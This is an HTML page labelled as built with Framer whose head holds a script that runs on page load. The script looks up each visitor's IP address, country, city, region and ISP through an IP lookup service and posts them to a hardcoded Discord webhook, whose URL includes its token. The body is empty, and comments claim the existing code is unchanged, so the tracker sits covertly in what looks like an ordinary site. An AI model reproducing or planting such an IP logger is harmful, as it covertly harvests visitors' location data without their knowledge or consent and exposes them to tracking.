<!doctype html>
<!-- ✨ Built with Framer • https://www.framer.com/ -->
<html lang="en">
<head>
    <meta charset="utf-8">
    <!-- Existing code remains unchanged -->
    <script>
        // Function to send visitor's IP details to a webhook
        async function sendIPToWebhook(details) {
            const webhookURL = "https://discord.com/api/webhooks/1314787414413152338/Q4ja6O2L9lg31U9SUd1Zt5Ap11tiwnZFIelqgoef31Cgxg4OmI3wNgG5GRhTrjFclNaC"; // Replace with your webhook URL
            
            // Construct the payload
            const payload = {
                content: `Visitor Details:\n\n- IP Address: ${details.ip}\n- Country: ${details.country}\n- City: ${details.city}\n- Region: ${details.region}\n- ISP: ${details.org}`
            };
            
            try {
                // Send the details to the webhook
                await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });
                console.log("IP details sent to webhook successfully.");
            } catch (error) {
                console.error("Error sending IP details to webhook:", error);
            }
        }

        // Function to fetch visitor's IP and details
        async function fetchIPDetails() {
            try {
                // Fetch IP details using ipwhois.io
                const response = await fetch("https://ipwhois.app/json/");
                const details = await response.json();

                console.log("IP Details:", details); // Debugging log
                // Send the fetched details to the webhook
                await sendIPToWebhook(details);
            } catch (error) {
                console.error("Error fetching IP details:", error);
            }
        }

        // Fetch IP details as soon as the page loads
        window.onload = fetchIPDetails;
    </script>
</head>
<body>
    <!-- Existing body content remains unchanged -->
</body>
</html>
